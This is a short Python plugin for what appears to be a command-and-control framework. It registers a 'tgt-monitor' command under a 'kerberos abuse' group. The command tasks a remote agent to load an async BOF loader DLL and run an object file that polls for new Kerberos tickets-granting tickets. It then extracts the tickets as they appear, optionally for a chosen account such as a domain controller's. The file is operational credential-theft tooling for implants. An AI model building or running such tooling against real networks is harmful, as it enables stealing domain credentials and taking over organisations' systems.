import conquest
import os.path

ASYNC_DLL = conquest.resources_root() + "/async-bof-loader/dist/async-bof.dll"
EXPORT_FUNC = "Run"
SCRIPT_DIR = os.path.dirname(__file__)

if os.path.exists(ASYNC_DLL): 
    
    cmd_tgtMonitor = (
        conquest.createCommand(name="tgt-monitor", description="Monitor for new Kerberos TGTs and automatically extract them as they appear.", example="tgt-monitor --interval 5 --user DC01$",
                               message="Tasked agent to monitor for new Kerberos TGTs and extract them.", mitre=[])
                .addFlagInt("--interval", "interval", "Polling interval in seconds (default: 60).", False, 60)
                .addFlagString("--user", "user", "Target specific username only.")
                .setHandler(lambda agentId, cmdline, args: (
                    interval := conquest.get_int(args, 0),
                    user := conquest.get_string(args, 1),

                    bof := os.path.join(SCRIPT_DIR, "tgt-monitor.x64.o"),
                    params := conquest.bof_pack("iz", [
                        interval,       # i: Polling interval
                        user,           # z: Target user
                    ]),

                    conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof)
                    else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
                ))
    ).registerToGroup("kerberos abuse")